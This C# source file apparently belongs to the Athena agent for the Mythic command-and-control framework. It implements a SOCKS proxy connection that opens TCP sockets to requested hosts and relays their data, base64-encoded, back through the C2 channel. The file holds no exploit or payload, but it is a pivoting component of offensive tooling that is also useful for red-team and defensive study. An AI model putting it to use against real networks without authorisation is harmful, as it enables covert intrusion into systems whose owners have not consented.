using Athena.Models.Athena.Commands;
using Athena.Models.Mythic.Response;
using Athena.Utilities;

namespace Athena.Models.Athena.Socks
{
    public class AthenaSocksConnection
    {
        public delegate void ExitRequestedHandler(object sender, SocksEventArgs e);
        public event EventHandler<SocksEventArgs> HandleSocksEvent;
        public int server_id { get; set; }
        public bool exited { get; set; }
        public bool isConnecting = false;
        public GodSharp.Sockets.TcpClient client { get; set; }
        public ManualResetEvent onSocksEvent = new ManualResetEvent(false);

        public AthenaSocksConnection(ConnectionOptions co) {
            this.server_id = co.server_id;
            this.exited = false;

            this.client = new GodSharp.Sockets.TcpClient(co.ip.ToString(), co.port)
            {
                OnConnected = (c) =>
                {
                    this.isConnecting = false;
                    SocksMessage smOut = new SocksMessage() //Put together our Mythic Response
                    {
                        server_id = this.server_id,
                        data = Misc.Base64Encode(new ConnectResponse
                        {
                            bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                            bndport = new byte[] { 0x00, 0x00 },
                            addrtype = co.addressType,
                            status = ConnectResponseStatus.Success,
                        }.ToByte()),
                        exit = this.exited
                    };
                    HandleSocksEvent(this, new SocksEventArgs(smOut));
                    this.onSocksEvent.Set();
                },
                OnReceived = (c) =>
                {
                    byte[] b = c.Buffers;

                    SocksMessage smOut = new SocksMessage
                    {
                        server_id = this.server_id,
                        data = Misc.Base64Encode(c.Buffers),
                        exit = this.exited
                    };

                    HandleSocksEvent(this, new SocksEventArgs(smOut));
                },
                OnDisconnected = (c) =>
                {

                    if (c.NetConnection.Connected)
                    {
                        this.exited = true;
                    }

                    SocksMessage smOut = new SocksMessage
                    {
                        server_id = this.server_id,
                        data = String.Empty,
                        exit = this.exited
                    };

                    HandleSocksEvent(this, new SocksEventArgs(smOut));
                },
                OnException = (c) =>
                {
                    this.isConnecting = false;
                    SocksMessage smOut = new SocksMessage
                    {
                        server_id = this.server_id,
                        data = Misc.Base64Encode(new ConnectResponse
                        {
                            bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                            bndport = new byte[] { 0x00, 0x00 },
                            addrtype = co.addressType,
                            status = ConnectResponseStatus.GeneralFailure,

                        }.ToByte()),
                        exit = this.exited
                    };
                    HandleSocksEvent(this, new SocksEventArgs(smOut));
                    this.onSocksEvent.Set();
                },
                OnStarted = (c) =>
                {
                    this.isConnecting = true;
                }
            };
        }

        public bool IsConnectedOrConnecting()
        {
            if (this.isConnecting)
            {
                this.onSocksEvent.WaitOne(60000);
            }

            return this.client.Connected;
        }
    }
}
